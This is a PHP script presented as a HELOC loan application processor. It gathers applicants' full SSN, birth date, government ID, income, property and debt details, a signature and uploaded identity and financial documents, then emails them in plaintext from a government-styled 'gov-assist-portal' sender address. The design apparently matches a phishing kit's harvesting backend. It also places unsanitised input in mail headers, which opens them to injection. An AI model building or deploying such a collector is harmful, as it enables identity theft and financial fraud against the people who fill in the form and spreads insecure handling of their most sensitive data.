<?php
/**
 * HELOC Application Processor
 * Sends full application details, including full SSN and file uploads, via email.
 */

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $clean = function ($key) {
        return isset($_POST[$key]) ? trim($_POST[$key]) : '';
    };

    $name               = $clean('full_name');
    $dob                = $clean('date_of_birth');
    $phone              = $clean('phone');
    $email              = $clean('email');
    $ssn                = $clean('ssn');
    $gov_id             = $clean('gov_id_number');
    $issuing_state      = $clean('issuing_state');
    $id_expiration      = $clean('id_expiration');
    $employment_status  = $clean('employment_status');
    $employer_name      = $clean('employer_name');
    $job_title          = $clean('job_title');
    $employment_length  = $clean('employment_length');
    $gross_income       = $clean('gross_monthly_income');
    $other_income       = $clean('other_income_sources');
    $property_address   = $clean('property_address');
    $property_type      = $clean('property_type');
    $primary_residence  = isset($_POST['primary_residence']) ? 'Yes' : 'No';
    $year_purchased     = $clean('year_purchased');
    $purchase_price     = $clean('purchase_price');
    $current_value      = $clean('current_value');
    $mortgage_balance   = $clean('mortgage_balance');
    $lender_name        = $clean('lender_name');
    $credit_score       = $clean('credit_score_range');
    $monthly_payment    = $clean('monthly_mortgage_payment');
    $other_debts        = $clean('other_monthly_debts');
    $bankruptcy_history = isset($_POST['bankruptcy_history']) ? 'Yes' : 'No';
    $foreclosure_history= isset($_POST['foreclosure_history']) ? 'Yes' : 'No';
    $requested_line     = $clean('requested_credit_line');
    $use_of_funds       = $clean('use_of_funds');
    $draw_period        = $clean('preferred_draw_period');
    $repayment_term     = $clean('preferred_repayment_term');
    $credit_pull_auth   = isset($_POST['credit_pull_auth']) ? 'Yes' : 'No';
    $certification      = isset($_POST['certification']) ? 'Yes' : 'No';
    $terms_agreement    = isset($_POST['terms_agreement']) ? 'Yes' : 'No';
    $digital_signature  = $clean('digital_signature');
    $signature_date     = $clean('signature_date');

    if (empty($name) || empty($email) || empty($ssn)) {
        die("Security error: Missing required fields.");
    }

    $ltv = 0;
    if ($current_value !== '' && $current_value > 0) {
        $total_debt = (float)$mortgage_balance + (float)$requested_line;
        $ltv = ($total_debt / (float)$current_value) * 100;
    }

    $fields = [
        "Full Legal Name" => $name,
        "Date of Birth" => $dob,
        "Phone" => $phone,
        "Email" => $email,
        "Full SSN" => $ssn,
        "Government ID Number" => $gov_id,
        "Issuing State" => $issuing_state,
        "ID Expiration Date" => $id_expiration,
        "Employment Status" => $employment_status,
        "Employer Name" => $employer_name,
        "Job Title" => $job_title,
        "Length of Employment" => $employment_length,
        "Gross Monthly Income" => $gross_income,
        "Other Income Sources" => $other_income,
        "Property Address" => $property_address,
        "Property Type" => $property_type,
        "Primary Residence" => $primary_residence,
        "Year Purchased" => $year_purchased,
        "Purchase Price" => $purchase_price,
        "Estimated Current Value" => $current_value,
        "Outstanding Mortgage Balance" => $mortgage_balance,
        "Current Mortgage Lender" => $lender_name,
        "Estimated Credit Score Range" => $credit_score,
        "Monthly Mortgage Payment" => $monthly_payment,
        "Other Monthly Debts" => $other_debts,
        "Bankruptcy History" => $bankruptcy_history,
        "Foreclosure History" => $foreclosure_history,
        "Requested Credit Line Amount" => $requested_line,
        "Intended Use of Funds" => $use_of_funds,
        "Preferred Draw Period" => $draw_period,
        "Preferred Repayment Term" => $repayment_term,
        "Calculated CLTV (%)" => round($ltv, 2),
        "Credit Pull Authorization" => $credit_pull_auth,
        "Certification" => $certification,
        "Agreement to Terms" => $terms_agreement,
        "Digital Signature" => $digital_signature,
        "Signature Date" => $signature_date,
    ];

    $message = "Official HELOC Application\n";
    $message .= "====================================\n\n";
    foreach ($fields as $label => $value) {
        $message .= "{$label}: {$value}\n";
    }
    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";

    // Prepare attachments
    $attachments = [];
    $fileFields = [
        'proof_identity' => 'Proof of Identity',
        'proof_income' => 'Proof of Income',
        'mortgage_statement' => 'Mortgage Statement',
        'homeowners_insurance' => 'Homeowners Insurance',
        'property_tax_statement' => 'Property Tax Statement',
    ];

    foreach ($fileFields as $field => $label) {
        if (isset($_FILES[$field]) && is_uploaded_file($_FILES[$field]['tmp_name'])) {
            $attachments[] = [
                'tmp_name' => $_FILES[$field]['tmp_name'],
                'name' => $_FILES[$field]['name'],
                'type' => $_FILES[$field]['type'] ?: 'application/octet-stream',
                'label' => $label,
            ];
        }
    }

    $to = "lending@your-agency-portal.com";
    $subject = "NEW HELOC APPLICATION: {$name}";
    $boundary = "==Multipart_Boundary_x" . md5(time()) . "x";

    $headers  = "From: underwriting@gov-assist-portal.com\r\n";
    $headers .= "Reply-To: {$email}\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"{$boundary}\"";

    $body  = "--{$boundary}\r\n";
    $body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $message . "\r\n";

    foreach ($attachments as $file) {
        $fileContent = file_get_contents($file['tmp_name']);
        if ($fileContent === false) {
            continue;
        }
        $data = chunk_split(base64_encode($fileContent));
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Type: {$file['type']}; name=\"{$file['name']}\"\r\n";
        $body .= "Content-Description: {$file['label']}\r\n";
        $body .= "Content-Disposition: attachment; filename=\"{$file['name']}\"; size=" . filesize($file['tmp_name']) . ";\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= $data . "\r\n";
    }
    $body .= "--{$boundary}--";

    if (mail($to, $subject, $body, $headers)) {
        header("Location: ../success.html");
        exit();
    } else {
        echo "An error occurred. Please try again later.";
    }
} else {
    header("Location: ../index.html");
    exit();
}
